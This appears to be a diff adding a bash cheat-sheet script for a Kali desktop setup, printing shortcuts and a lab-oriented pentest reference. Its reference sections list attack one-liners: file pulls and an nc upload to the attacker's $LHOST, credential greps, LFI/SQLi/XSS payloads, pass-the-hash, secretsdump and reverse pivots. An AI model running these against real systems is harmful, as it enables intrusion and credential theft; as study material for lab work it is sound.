@@ -1,0 +1,235 @@
+#!/usr/bin/env bash
+# Tokyo Night cheat-sheet for this rice. Run: cheat   (or: cheat htb / tmux / desktop)
+B=$'\e[38;2;122;162;247m'   # blue
+C=$'\e[38;2;125;207;255m'   # cyan
+P=$'\e[38;2;187;154;247m'   # purple
+G=$'\e[38;2;158;206;106m'   # green
+R=$'\e[38;2;247;118;142m'   # red
+Y=$'\e[38;2;224;175;104m'   # yellow
+D=$'\e[38;2;86;95;137m'     # dim
+W=$'\e[38;2;192;202;245m'   # bright
+BD=$'\e[1m'; X=$'\e[0m'
+h(){ printf "\n${BD}${P}  %s${X}\n${D}  ────────────────────────────────────────────────${X}\n" "$1"; }
+k(){ printf "  ${C}%-22s${X} ${W}%s${X}\n" "$1" "$2"; }
+
+banner(){ printf "${B}${BD}
+   ┌─────────────────────────────────────────────┐
+   │   3xploiter0 · Kali rice cheat-sheet         │
+   └─────────────────────────────────────────────┘${X}
+${D}   tip: ${C}cheat htb${D} · ${C}cheat tmux${D} · ${C}cheat desktop${D} · ${C}cheat shell${X}\n"; }
+
+desktop(){ h "DESKTOP (Super = Windows key)"
+k "Super+Return"        "new terminal"
+k "Super+Space"         "app launcher (type + Enter)"
+k "Super+Ctrl+Space"    "next wallpaper"
+k "Super+1..5"          "go to workspace 1-5"
+k "Super+Shift+1..5"    "move window to workspace"
+k "Super+Q / Alt+F4"    "close window"
+k "Super+drag"          "move window (no title bar)"
+k "drag to edge"        "snap window to half"
+h "macOS FEELS"
+k "F4  /  Super+A"      "Launchpad — fullscreen app grid"
+k "F3"                  "Mission Control — all open windows"
+k "hot corner ↖"        "top-left = Mission Control"
+k "hot corner ↙"        "bottom-left = Launchpad"
+k "dock (bottom)"       "running apps + Launchpad; right-click icon > Pin to Dock"
+h "EYE CANDY"
+k "livewp on / off"     "animated video wallpaper (~/vidwall/*.mp4)"
+k "wal-cycle"           "recolor terminals from wallpaper  ·  wal-cycle reset"
+k "conky HUD"           "desktop clock+stats (top-right, autostarts)"; }
+
+htb(){ h "START A HACK"
+k "htb <ip> <box>"      "HTB workspace (target + folders + tmux)"
+k "thm/pg/vh/ctf <ip> <n>" "same for TryHackMe/ProvingGrounds/VulnHub/CTF"
+k "  "                  "${D}-> ~/cyber/labs/<platform>/<box>/{nmap,loot,exploits,notes.md}${X}"
+k "boxes [platform]"    "progress across ALL platforms (user/root flags)"
+k "map"                 "where everything lives (~/cyber layout)"
+k "tmux attach -t <p>-<box>" "re-open a workspace later"
+h "TARGET / VPN"
+k "target <ip>"         "set target (red in bar/prompt/tmux)"
+k "target"             "show it   ·   target clear = remove"
+k "click red IP"        "copies target   ·   click blue IP = VPN IP"
+k "\$TARGET  \$LHOST"     "auto-filled, e.g. nmap -sCV \$TARGET"
+k "sudo openvpn f.ovpn"  "connect VPN (blue IP appears)"
+h "PAYLOADS & REPORT"
+k "revshell [ip] [port] [sh]" "print reverse shells (bash/python/php/ps..)"
+k "  "                  "${D}auto-uses \$LHOST + port 4444, copies first to clipboard${X}"
+k "report <box>"        "build a markdown pentest report from notes+logs"
+h "AUTOMATION"
+k "recon <ip>"          "full port scan + auto service enum (web/smb/ftp..)"
+k "recon-web <domain>"  "subfinder -> httpx -> nuclei (authorized scope only)"
+k "vpn <htb|thm|path>"  "connect .ovpn  ·  vpn down  ·  vpn status"
+k "addhost <ip> <name>" "add /etc/hosts entry  ·  addhost <name> = remove"
+k "arsenal"             "install missing tools + update all"
+k "wl / wl web / wl dns" "wordlists: cd seclists / print a path"
+k "pwncat-cs -lp 4444"  "smart reverse-shell catcher (auto TTY)"
+h "DAILY OPS"
+k "serve"               "HTTP server + paste-ready wget/curl (your IP filled)"
+k "gettools"            "stage linpeas/winpeas/pspy/chisel into ~/cyber/tools/serve"
+k "status"              "one glance: VPN, target, box, listeners"
+k "note \"text\""        "timestamped line into current box notes.md"
+k "loot <file>"         "copy a file into the box loot/ folder"
+k "crack <hash|file>"   "auto-detect + hashcat vs rockyou"
+k "cat x | copy"        "clipboard  ·  paste > file"; }
+
+ref_ports(){ h "COMMON PORTS"
+k "21 ftp"   "anon login, ftp \$TARGET"; k "22 ssh"  "keys, creds, ssh user@\$TARGET"
+k "25 smtp"  "VRFY users, open relay";    k "53 dns"  "zone xfer: dig axfr @\$TARGET"
+k "80/443 http" "fuzz, vhost, nikto, source"; k "88 kerb" "AS-REP, kerberoast"
+k "111 rpc"  "rpcinfo, showmount -e";     k "139/445 smb" "enum4linux-ng, smbclient -L"
+k "161 snmp" "snmpwalk -c public -v1";    k "389 ldap" "ldapsearch -x"
+k "1433 mssql" "mssqlclient";             k "3306 mysql" "mysql -h \$TARGET -u root"
+k "3389 rdp" "xfreerdp /v:\$TARGET";      k "5985 winrm" "evil-winrm -i \$TARGET"
+k "6379 redis" "redis-cli -h \$TARGET"; }
+
+ref_transfer(){ h "FILE TRANSFER (serve = your IP pre-filled)"
+k "linux pull"  "wget http://\$LHOST:8000/f -O /tmp/f"
+k "  "          "curl http://\$LHOST:8000/f -o /tmp/f"
+k "windows"     "certutil -urlcache -f http://\$LHOST:8000/f f"
+k "  "          "powershell iwr http://\$LHOST:8000/f -o f"
+k "upload here" "nc -lvnp 9001 > out  (target: nc \$LHOST 9001 < file)"
+k "base64"      "base64 -w0 f  ->  paste  ->  base64 -d > f"
+k "scp"         "scp f user@\$TARGET:/tmp/"; }
+
+ref_privesc(){ h "PRIVESC QUICK CHECKS"
+k "auto"     "linpeas.sh | tee lin.txt   (serve it from gettools)"
+k "sudo"     "sudo -l   (GTFOBins: pay sudo)"
+k "suid"     "find / -perm -4000 2>/dev/null"
+k "caps"     "getcap -r / 2>/dev/null"
+k "cron"     "cat /etc/crontab; ls -la /etc/cron*"
+k "writable" "find / -writable -type d 2>/dev/null"
+k "creds"    "grep -riE 'password|passwd' /etc /var/www 2>/dev/null"
+k "kernel"   "uname -a  ->  searchsploit"
+k "windows"  "winpeas.exe � whoami /priv � pay token"; }
+
+ref_web(){ h "WEB EXPLOITATION"
+k "dirs/vhost"  "fuzz <url> � vhost <domain>"
+k "LFI"         "../../../etc/passwd � php://filter � pay lfi"
+k "SQLi"        "' OR 1=1-- � sqlmap -u URL --batch � pay sqli"
+k "SSTI"        "{{7*7}} {{config}} � pay ssti"
+k "upload"      "php/phtml/.htaccess bypass � pay upload"
+k "XSS"         "<script>alert(1)</script> � pay xss"
+k "creds"       "admin:admin, default creds, view-source"; }
+
+ref_ad(){ h "ACTIVE DIRECTORY"
+k "enum"        "nxc smb \$TARGET -u u -p p --shares/--users"
+k "AS-REP"      "GetNPUsers.py dom/ -usersfile u -no-pass"
+k "kerberoast"  "GetUserSPNs.py dom/u:p -request"
+k "bloodhound"  "bloodhound-python -d dom -u u -p p -c all"
+k "pth"         "nxc smb \$TARGET -u u -H <hash>"
+k "dump"        "secretsdump.py dom/u:p@\$TARGET"
+k "shell"       "evil-winrm -i \$TARGET -u u -p p"; }
+
+ref_pivot(){ h "PIVOTING / PORT FORWARD"
+k "ssh local"   "ssh -L 8080:127.0.0.1:80 user@\$TARGET"
+k "ssh dynamic" "ssh -D 1080 user@\$TARGET  (+ proxychains)"
+k "chisel srv"  "chisel server -p 9001 --reverse"
+k "chisel cli"  "chisel client \$LHOST:9001 R:socks"
+k "ligolo"      "ligolo-proxy -selfcert  (agent -connect \$LHOST:11601)"; }
+
+ref_crack(){ h "HASH CRACKING (crack <file> auto-detects)"
+k "identify"    "hashid '<hash>'  �  hash-identifier"
+k "md5/sha1"    "hashcat -m 0 / -m 100 h rockyou.txt"
+k "ntlm"        "hashcat -m 1000 h rockyou.txt"
+k "net-ntlmv2"  "hashcat -m 5600 h rockyou.txt"
+k "bcrypt"      "hashcat -m 3200 h rockyou.txt"
+k "linux sha512" "hashcat -m 1800 h rockyou.txt"
+k "files"       "crackzip <file>  (zip/rar/pdf/ssh)"; }
+
+ref_linux(){ h "LINUX ENUM"
+k "auto"     "linpeas.sh ; pspy64 (watch cron)"
+k "who/sys"  "id; sudo -l; uname -a; hostname"
+k "suid"     "find / -perm -4000 2>/dev/null"
+k "caps"     "getcap -r / 2>/dev/null"
+k "cron"     "cat /etc/crontab; ls -la /etc/cron*"
+k "network"  "ss -tulpn; ip a; cat /etc/hosts"
+k "files"    "ls -la /home/*; cat ~/.*history"
+k "creds"    "grep -riE 'pass|secret|key' /var/www /etc 2>/dev/null"; }
+
+ref_windows(){ h "WINDOWS ENUM"
+k "auto"     "winPEASx64.exe ; powerup"
+k "who/sys"  "whoami /all; systeminfo; hostname"
+k "privs"    "whoami /priv  (SeImpersonate -> potato)"
+k "users"    "net user; net localgroup administrators"
+k "network"  "ipconfig /all; netstat -ano; arp -a"
+k "services" "sc query; wmic service get name,pathname"
+k "search"   "findstr /si password *.txt *.xml *.ini"
+k "shell"    "evil-winrm ; runas ; RunasCs.exe"; }
+
+learn(){ h "LEARNING & PRODUCTIVITY"
+k "brief"               "daily cyber news + actively-exploited CVEs"
+k "pay <query>"         "offline payloads/techniques (PayloadsAllTheThings+GTFOBins)"
+k "kb add \"tip\""       "save a command/trick  ·  kb <query> = search"
+k "journal \"…\""        "log what you learned today (+ streak)"
+k "roadmap"             "study path (checkboxes)  ·  roadmap -s = progress"
+k "boxes"               "your machine progress (user/root flags)"
+k "writeup <box>"       "scaffold a blog-ready writeup from notes"; }
+
+quick(){ h "QUICK CTF VERBS"
+k "listen [port]"       "catch a reverse shell (pwncat auto-TTY) � default 4444"
+k "ports <ip>"          "fast top-ports scan (triage before recon)"
+k "fuzz <url> [wl]"     "quick dir brute (feroxbuster; FUZZ -> ffuf)"
+k "vhost <domain> [ip]" "virtual-host / subdomain fuzz"
+k "spawn"               "print+copy the TTY-stabilize steps"
+k "enc <b64|hex|url|rot13> <t>" "encode  �  dec = decode"
+k "steg <file>"         "forensics gauntlet (exif/strings/binwalk/steghide)"
+k "extract <file>"      "unpack any archive"
+k "search <term>"       "searchsploit (Exploit-DB)"
+k "smb <ip>"            "quick SMB share enum"
+k "magic <text>"        "auto-decode (b64/hex/rot13/url/b32)"
+k "crackzip <file>"     "crack zip/rar/pdf/ssh-key (john+rockyou)"
+k "sshkey [name]"       "gen ssh key for authorized_keys"
+k "www [port]"          "serve CURRENT folder over http"
+k "qr <img>"            "decode a QR/barcode"
+k "genpass [n]"         "random password  �  rocky <re> = grep rockyou"
+k "cve <id>"            "quick CVE lookup"
+k "payload <type> [port]" "msfvenom reverse shell (exe/elf/php/war)"
+k "tunnel chisel|ligolo" "one-command pivot setup"
+k "creds add <box> <u> <p>" "credential vault - creds [query] to search"; }
+
+tmuxc(){ h "TMUX  (prefix = Ctrl+b, press then release)"
+k "Alt + arrows"        "move between panes"
+k "prefix |  /  -"      "split left-right / top-bottom"
+k "prefix c"            "new window   ·   prefix 1/2.. switch"
+k "prefix z"            "zoom pane fullscreen (toggle)"
+k "prefix d"            "detach (scans keep running)"
+k "prefix L"            "toggle logging this pane"
+k "prefix [ , q"        "scroll mode (q to quit)   ·   mouse works"
+k "prefix r"            "reload tmux config"; }
+
+shell(){ h "SHELL SPEED"
+k "z <part-of-dir>"     "jump to a folder you've visited"
+k "Ctrl+R"              "fuzzy-search command history"
+k "Ctrl+T"              "fuzzy-find a file into the command"
+k "cat <file>"          "colored syntax view (bat)"
+k "ls / ll / la"        "files with icons (eza)"
+h "NOTES & LOGS"
+k "logs"                "list today's terminal logs"
+k "logclean <file>"     "clean a log for a report"
+k "nvim notes.md"       "edit notes (i=type, Esc, :w=save, :q=quit)"
+k "rice"                "fastfetch + btop + visualizer layout"
+h "BACKUP & BURP"
+k "rice-backup"         "snapshot all your configs to ~/.rice-dotfiles (git)"
+k "rice-backup <url>"   "...and push to a private GitHub repo"
+k "sudo timeshift --create -c msg" "full system restore point"
+k "burpchrome"          "Chrome routed through Burp (127.0.0.1:8080)"
+k "burpcert"            "trust Burp CA (run once, Burp open)"
+k "update"              "apt + tools + templates + backup&push (runs weekly auto)"; }
+
+case "$1" in
+  htb)     banner; htb ;;
+  tmux)    banner; tmuxc ;;
+  desktop) banner; desktop ;;
+  shell)   banner; shell ;;
+  learn)   banner; learn ;;
+  ports)   banner; ref_ports ;;
+  transfer) banner; ref_transfer ;;
+  privesc) banner; ref_privesc ;;
+  web)     banner; ref_web ;;
+  ad)      banner; ref_ad ;;
+  pivot)   banner; ref_pivot ;;
+  crack)   banner; ref_crack ;;
+  linux)   banner; ref_linux ;;
+  windows) banner; ref_windows ;;
+  *)       banner; desktop; htb; quick; tmuxc; shell; learn; echo ;;
+esac
